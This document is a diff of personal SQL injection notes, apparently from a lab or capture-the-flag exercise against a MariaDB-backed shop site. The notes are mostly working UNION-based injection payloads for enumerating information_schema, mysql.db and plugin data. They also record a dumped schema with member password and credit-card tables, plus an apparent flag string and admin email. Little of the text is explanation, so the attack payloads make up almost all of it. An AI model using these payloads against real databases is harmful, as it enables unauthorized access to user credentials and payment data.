@@ -417,7 +417,7 @@ MariaDB [(information_schema)]> select name,cost,year from session.car
                                   <column><column><column>  <database>.<table>
 Audi ' UNION SELECT Db,2,Host,User,5 FROM mysql.db #
 
-Audi ' UNION SELECT session_id,2,user_id,status,start FROM session.session_log #
+Audi ' UNION SELECT PLUGIN_NAME,PLUGIN_VERSION FROM information_schema.ALL_PLUGINS #'
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Information_Schema
   Tables
@@ -433,6 +433,7 @@ Audi ' UNION SELECT 1,2,3,4 #' <- Do this to see how many fields the request wan
 
 ## Modify golden statement to include all information
 UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #                     <- add buffer numbers (2 and 5) so that the golden statement will run
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Get edition SQL injection
 
@@ -448,7 +449,36 @@ Get edition SQL injection
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+TABLE NAMES SQL FLAGS
+sqlinjection- categories, members, orderlines, orders,payments,permissions,products,share4
+
+CREVjLhhneaXcpyHZ7W9
+admin@website.com
+
+categories - id, name, description
+members- id, username, password, first_name, last_name, email, permission
+products - id, name, description, price, qty_left, category
+share4 - id, comment, mime, data
+payments - id,creditcard_number,date,order
+orders- id,date,member
+orderlines- id, quantity, product, order
+
+
+APPLICABLE_ROLES - GRANTEE, ROLE_NAME, IS_GRANTABLE, IS_DEFAULT
+
+
+
+
+permissions	id
+permissions	level
+permissions	name
+permissions	description
+products	id
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Optic-100-Silver' UNION SELECT GRANTEE,ROLE_NAME FROM information_schema.columns#'
+
+Optic-100-Silver' UNION SELECT table_schema,table_name FROM information_schema.columns #'
+Optic-100-Silver' UNION SELECT table_name,column_name FROM information_schema.columns #'     <- Shows table name and column name
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
